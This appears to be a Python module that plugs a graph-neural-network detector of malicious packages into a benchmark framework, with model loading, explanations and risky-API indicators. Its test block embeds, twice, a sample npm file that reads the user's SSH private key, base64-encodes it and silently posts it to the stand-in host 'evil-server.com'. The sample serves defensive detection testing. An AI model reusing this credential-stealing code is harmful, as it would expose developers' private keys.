"""
Integration of CPG-GNN with the ICN benchmark framework.
Adds CPGBenchmarkModel to enable comparison with ICN, AMIL, LLMs, and other models.
"""

import time
import logging
from pathlib import Path
from typing import Dict, List, Optional, Any
import torch

# Import from ICN benchmark framework
from icn.evaluation.benchmark_framework import BaseModel, BenchmarkResult, BenchmarkSample

# Import CPG components
from cpg.model import CPGModel, create_cpg_model
from cpg.graph_builder import CPGBuilder, CodePropertyGraph
from cpg.config import CPGConfig, EvaluationConfig, create_default_config

logger = logging.getLogger(__name__)


class CPGBenchmarkModel(BaseModel):
    """CPG-GNN model wrapper for benchmark framework integration."""
    
    def __init__(self, model_path: Optional[str] = None, 
                 cpg_config: Optional[CPGConfig] = None,
                 device: str = "auto"):
        super().__init__("CPG-GNN")
        
        # Device selection
        if device == "auto":
            self.device = torch.device("cuda" if torch.cuda.is_available() else "cpu")
        else:
            self.device = torch.device(device)
        
        # Configuration
        if cpg_config is None:
            cpg_config, _, _ = create_default_config()
        self.config = cpg_config
        
        # Initialize components
        self.cpg_builder = CPGBuilder(cpg_config)
        
        # Load or create model
        if model_path and Path(model_path).exists():
            self._load_trained_model(model_path)
            logger.info(f"Loaded trained CPG-GNN model from {model_path}")
        else:
            # Create untrained model (for baseline comparison)
            self.model = create_cpg_model(cpg_config, str(self.device))
            logger.warning("Using untrained CPG-GNN model - results will be random")
        
        logger.info(f"CPG-GNN benchmark model initialized on {self.device}")
    
    def _load_trained_model(self, model_path: str):
        """Load trained CPG-GNN model from checkpoint."""
        try:
            checkpoint = torch.load(model_path, map_location=self.device)
            
            # Load configurations if available
            if "cpg_config" in checkpoint:
                self.config = checkpoint["cpg_config"]
                # Reinitialize builder with loaded config
                self.cpg_builder = CPGBuilder(self.config)
            
            # Create model and load weights
            self.model = create_cpg_model(self.config, str(self.device))
            
            if "model_state_dict" in checkpoint:
                self.model.load_state_dict(checkpoint["model_state_dict"])
            
            # Set to evaluation mode
            self.model.eval()
            
        except Exception as e:
            logger.error(f"Failed to load CPG-GNN model: {e}")
            # Fallback to untrained model
            self.model = create_cpg_model(self.config, str(self.device))
    
    async def predict(self, sample: BenchmarkSample) -> BenchmarkResult:
        """Make prediction using CPG-GNN model."""
        start_time = time.time()
        
        try:
            # Convert BenchmarkSample to CPG format
            file_contents = self._convert_benchmark_sample_to_files(sample)
            
            if not file_contents:
                return self._create_error_result(sample, "No extractable files found")
            
            # Build Code Property Graph
            cpg = self.cpg_builder.build_package_graph(
                sample.package_name,
                sample.ecosystem,
                file_contents
            )
            
            # Get prediction
            output = self.model.predict_package(cpg)
            
            # Create explanation
            explanation = self._create_explanation(output, cpg)
            
            return BenchmarkResult(
                model_name=self.model_name,
                sample_id=f"{sample.ecosystem}_{sample.package_name}",
                ground_truth=sample.ground_truth_label,
                prediction=output.prediction,
                confidence=output.confidence,
                inference_time_seconds=time.time() - start_time,
                explanation=explanation,
                malicious_indicators=self._extract_malicious_indicators(output, cpg),
                success=True,
                metadata={
                    "num_nodes": output.num_nodes,
                    "num_edges": output.num_edges,
                    "num_files": cpg.num_files,
                    "graph_size": cpg.total_nodes,
                    "attention_entropy": self._get_attention_entropy(output),
                    "top_suspicious_subgraphs": output.top_suspicious_subgraphs or []
                }
            )
            
        except Exception as e:
            logger.error(f"CPG-GNN prediction failed for {sample.package_name}: {e}")
            return self._create_error_result(sample, str(e), time.time() - start_time)
    
    def _convert_benchmark_sample_to_files(self, sample: BenchmarkSample) -> Dict[str, str]:
        """Convert BenchmarkSample to file contents dict."""
        file_contents = {}
        
        # Use individual files if available, otherwise parse combined content
        if sample.individual_files:
            file_contents = sample.individual_files.copy()
        else:
            # Parse combined content by file separators
            content_parts = sample.raw_content.split("=" * 50)  # File separator
            
            for i, part in enumerate(content_parts):
                if part.strip():
                    # Try to extract file path from content
                    lines = part.strip().split('\n')
                    file_path = f"file_{i}.unknown"
                    
                    # Look for file header
                    if lines and lines[0].startswith("# File:"):
                        try:
                            file_path = lines[0].split("# File:")[1].strip().split()[0]
                        except:
                            pass
                    
                    # Extract actual content (skip header)
                    content = '\n'.join(lines[1:] if lines[0].startswith("#") else lines)
                    
                    if content.strip():
                        file_contents[file_path] = content
        
        return file_contents
    
    def _create_explanation(self, output, cpg: CodePropertyGraph) -> str:
        """Create human-readable explanation."""
        explanation_parts = []
        
        # Main verdict
        verdict = "MALICIOUS" if output.prediction == 1 else "BENIGN"
        confidence = output.confidence
        explanation_parts.append(f"CPG-GNN Verdict: {verdict} (confidence: {confidence:.3f})")
        
        # Graph analysis
        explanation_parts.append(f"Analyzed graph with {output.num_nodes} nodes and {output.num_edges} edges")
        explanation_parts.append(f"Package contains {cpg.num_files} files")
        
        # Suspicious subgraphs
        if output.top_suspicious_subgraphs:
            explanation_parts.append("Top suspicious subgraphs:")
            for i, subgraph in enumerate(output.top_suspicious_subgraphs[:3]):
                attention_weight = subgraph.get('attention_weight', 0.0)
                explanation_parts.append(f"  - Subgraph {i+1} (attention: {attention_weight:.3f})")
        
        # API analysis
        if cpg.api_calls:
            api_list = list(cpg.api_calls)[:5]  # Top 5 APIs
            explanation_parts.append(f"Detected APIs: {', '.join(api_list)}")
        
        # Edge type distribution
        if cpg.edge_types:
            total_edges = sum(cpg.edge_types.values())
            edge_info = []
            for edge_type, count in cpg.edge_types.items():
                if count > 0:
                    percentage = (count / total_edges) * 100
                    edge_info.append(f"{edge_type}({percentage:.1f}%)")
            if edge_info:
                explanation_parts.append(f"Edge distribution: {', '.join(edge_info)}")
        
        return "; ".join(explanation_parts)
    
    def _extract_malicious_indicators(self, output, cpg: CodePropertyGraph) -> List[str]:
        """Extract malicious indicators for benchmark result."""
        indicators = []
        
        # From subgraph analysis
        if output.top_suspicious_subgraphs:
            for subgraph in output.top_suspicious_subgraphs[:3]:
                node_type = subgraph.get('node_type', 'unknown')
                attention_weight = subgraph.get('attention_weight', 0.0)
                indicators.append(f"suspicious_subgraph:{node_type}({attention_weight:.3f})")
        
        # From API analysis
        for api in cpg.api_calls:
            if any(risky_api in api.lower() for risky_api in ['subprocess', 'eval', 'exec', 'network']):
                indicators.append(f"risky_api:{api}")
        
        # From graph structure
        if cpg.total_nodes > 1000:
            indicators.append("large_graph:excessive_complexity")
        
        if cpg.edge_types.get('dfg', 0) > cpg.edge_types.get('ast', 1) * 2:
            indicators.append("complex_dataflow:high_dfg_ratio")
        
        # From auxiliary predictions
        if hasattr(output, 'api_predictions') and output.api_predictions is not None:
            # Get top predicted risky APIs
            api_probs = torch.sigmoid(output.api_predictions)
            top_api_indices = torch.topk(api_probs, min(3, len(self.config.risky_apis))).indices
            
            for idx in top_api_indices:
                api_name = self.config.risky_apis[idx.item()]
                prob = api_probs[idx].item()
                if prob > 0.5:
                    indicators.append(f"predicted_api:{api_name}({prob:.3f})")
        
        return list(set(indicators))  # Remove duplicates
    
    def _get_attention_entropy(self, output) -> float:
        """Calculate attention entropy if available."""
        if hasattr(output, 'attention_weights') and output.attention_weights is not None:
            import torch.nn.functional as F
            import math
            
            weights = output.attention_weights.squeeze()
            if weights.numel() > 1:
                probs = F.softmax(weights, dim=-1)
                entropy = -(probs * torch.log(probs + 1e-8)).sum()
                max_entropy = math.log(weights.numel())
                return (entropy / max_entropy).item() if max_entropy > 0 else 0.0
        
        return 0.0
    
    def _create_error_result(self, sample: BenchmarkSample, error_msg: str, 
                           inference_time: float = 0.0) -> BenchmarkResult:
        """Create error result."""
        return BenchmarkResult(
            model_name=self.model_name,
            sample_id=f"{sample.ecosystem}_{sample.package_name}",
            ground_truth=sample.ground_truth_label,
            prediction=0,  # Conservative prediction
            confidence=0.5,  # Neutral confidence
            inference_time_seconds=inference_time,
            explanation=f"CPG-GNN analysis failed: {error_msg}",
            success=False,
            error_message=error_msg
        )
    
    def get_model_info(self) -> Dict[str, Any]:
        """Get CPG-GNN model information."""
        return {
            "model_type": "CPG-GNN",
            "model_class": "Graph Neural Network on Code Property Graphs",
            "approach": "Structural and semantic flow analysis with GNN",
            "supports_explanations": True,
            "supports_subgraph_localization": True,
            "inference_method": "local",
            "device": str(self.device),
            
            # Configuration details
            "config": {
                "gnn_type": self.config.gnn_type,
                "num_gnn_layers": self.config.num_gnn_layers,
                "pooling_type": self.config.pooling_type,
                "max_nodes_per_graph": self.config.max_nodes_per_graph,
                "include_ast_edges": self.config.include_ast_edges,
                "include_cfg_edges": self.config.include_cfg_edges,
                "include_dfg_edges": self.config.include_dfg_edges,
                "num_risky_apis": len(self.config.risky_apis)
            }
        }
    
    def get_detailed_prediction(self, sample: BenchmarkSample) -> Dict[str, Any]:
        """Get detailed prediction with full graph analysis."""
        try:
            # Convert to CPG format
            file_contents = self._convert_benchmark_sample_to_files(sample)
            
            if not file_contents:
                return {"error": "No extractable files"}
            
            # Build CPG
            cpg = self.cpg_builder.build_package_graph(
                sample.package_name,
                sample.ecosystem,
                file_contents
            )
            
            # Get detailed explanation
            explanation = self.model.get_attention_explanation(cpg)
            
            return explanation
            
        except Exception as e:
            logger.error(f"Detailed prediction failed: {e}")
            return {"error": str(e)}


def create_cpg_benchmark_model(model_path: Optional[str] = None,
                              device: str = "auto") -> CPGBenchmarkModel:
    """Create CPG-GNN benchmark model with default configuration."""
    return CPGBenchmarkModel(model_path=model_path, device=device)


# Integration function to add CPG-GNN to existing benchmark suites
def add_cpg_to_benchmark_suite(benchmark_suite, model_path: Optional[str] = None):
    """
    Add CPG-GNN model to an existing benchmark suite.
    
    Args:
        benchmark_suite: Existing ICN benchmark suite
        model_path: Optional path to trained CPG-GNN model
    """
    cpg_model = create_cpg_benchmark_model(model_path)
    
    # Add to benchmark suite (assuming it has a register_model method)
    if hasattr(benchmark_suite, 'register_model'):
        benchmark_suite.register_model(cpg_model)
        logger.info("✅ CPG-GNN model added to benchmark suite")
    else:
        logger.warning("⚠️  Benchmark suite doesn't support model registration")
    
    return cpg_model


if __name__ == "__main__":
    # Test CPG-GNN benchmark integration
    import asyncio
    
    async def test_cpg_benchmark():
        """Test CPG-GNN benchmark model."""
        
        # Create test sample
        test_sample = BenchmarkSample(
            package_name="test-malicious-package",
            ecosystem="npm",
            sample_type="malicious_intent",
            ground_truth_label=1,
            raw_content="""
# File: package.json
{"name": "test", "version": "1.0.0"}
==================================================
# File: index.js
const fs = require('fs');
const crypto = require('crypto');
const https = require('https');

function stealCredentials() {
    const homeDir = require('os').homedir();
    
    // Read SSH keys
    try {
        const sshKey = fs.readFileSync(homeDir + '/.ssh/id_rsa', 'utf8');
        
        // Encode stolen data
        const encoded = Buffer.from(sshKey).toString('base64');
        
        // Exfiltrate to remote server
        const postData = JSON.stringify({ data: encoded });
        
        const options = {
            hostname: 'evil-server.com',
            port: 443,
            path: '/collect',
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(postData)
            }
        };
        
        const req = https.request(options);
        req.write(postData);
        req.end();
        
    } catch (e) {
        // Silent failure
    }
}

// Execute payload
stealCredentials();

module.exports = {};
==================================================
            """.strip(),
            file_paths=["package.json", "index.js"],
            individual_files={
                "package.json": '{"name": "test", "version": "1.0.0"}',
                "index.js": """const fs = require('fs');
const crypto = require('crypto');
const https = require('https');

function stealCredentials() {
    const homeDir = require('os').homedir();
    
    // Read SSH keys
    try {
        const sshKey = fs.readFileSync(homeDir + '/.ssh/id_rsa', 'utf8');
        
        // Encode stolen data
        const encoded = Buffer.from(sshKey).toString('base64');
        
        // Exfiltrate to remote server
        const postData = JSON.stringify({ data: encoded });
        
        const options = {
            hostname: 'evil-server.com',
            port: 443,
            path: '/collect',
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(postData)
            }
        };
        
        const req = https.request(options);
        req.write(postData);
        req.end();
        
    } catch (e) {
        // Silent failure
    }
}

// Execute payload
stealCredentials();

module.exports = {};"""
            },
            num_files=2
        )
        
        # Create CPG-GNN model (untrained for testing)
        cpg_model = create_cpg_benchmark_model()
        
        # Test prediction
        result = await cpg_model.predict(test_sample)
        
        print("🧪 CPG-GNN Benchmark Test Results:")
        print(f"   Model: {result.model_name}")
        print(f"   Prediction: {'MALICIOUS' if result.prediction else 'BENIGN'}")
        print(f"   Confidence: {result.confidence:.3f}")
        print(f"   Inference time: {result.inference_time_seconds:.3f}s")
        print(f"   Success: {result.success}")
        print(f"   Explanation: {result.explanation}")
        print(f"   Indicators: {result.malicious_indicators}")
        
        # Test detailed prediction
        detailed = cpg_model.get_detailed_prediction(test_sample)
        print(f"\n📊 Detailed Analysis:")
        if "error" not in detailed:
            print(f"   Prediction: {detailed.get('prediction', {})}")
            print(f"   Graph stats: {detailed.get('graph_stats', {})}")
            print(f"   Suspicious subgraphs: {len(detailed.get('suspicious_subgraphs', []))}")
        else:
            print(f"   Error: {detailed['error']}")
        
        print("✅ CPG-GNN benchmark integration test completed")
    
    # Run test
    asyncio.run(test_cpg_benchmark())